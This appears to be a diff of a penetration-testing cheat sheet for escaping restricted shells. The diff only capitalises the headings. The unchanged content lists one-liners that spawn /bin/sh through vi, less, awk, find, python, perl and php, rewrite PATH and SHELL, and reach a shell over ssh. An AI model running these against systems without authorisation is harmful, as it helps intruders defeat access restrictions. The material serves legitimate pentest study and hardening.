@@ -1,66 +1,66 @@
-### check for writeable environment variables - if the PATH is writeable, set it to /bin/sh or similar
+### Check for writeable environment variables - if the PATH is writeable, set it to /bin/sh or similar
 ```
 env
 export -p
 ```
 
-### if / is allowed in commands
+### If / is allowed in commands
 ```
 export PATH=/bin:/usr/bin:/sbin:$PATH
 export SHELL=/bin/sh
 ```
 
-### change the shell
+### Change the shell
 ```
 chsh
 ```
 
-### copy into existing PATH
+### Copy into existing PATH
 ```
 cp /bin/sh <path/to/directory>; sh
 ```
 
-### more, less, man, ftp,gdb
+### More, less, man, ftp,gdb
 ```
 !/bin/sh
 ```
 
-### vi, vim
+### Vi, vim
 ```
 :!/bin/sh
 ```
 
-### awk
+### Awk
 ```
 awk 'BEGIN {system("/bin/sh")}'
 ```
 
-### find
+### Find
 ```
 find / -name <string> -exec /bin/sh ;
 ```
 
-### tee
+### Tee
 ```
 echo "<command>" | tee <file>.sh
 ```
 
-### python
+### Python
 ```
 python -c 'import os; os.system("/bin/bash")
 ```
 
-### perl
+### Perl
 ```
 perl -e 'exec "/bin/sh";'
 ```
 
-### php
+### Php
 ```
 php -r "pcntl_exec('/bin/sh', ['-p']);"
 ```
 
-### ssh
+### Ssh
 ```
 ssh <user>@<rhost> -t "/bin/sh"
 ssh <user>@<rhost> -t "bash --noprofile"
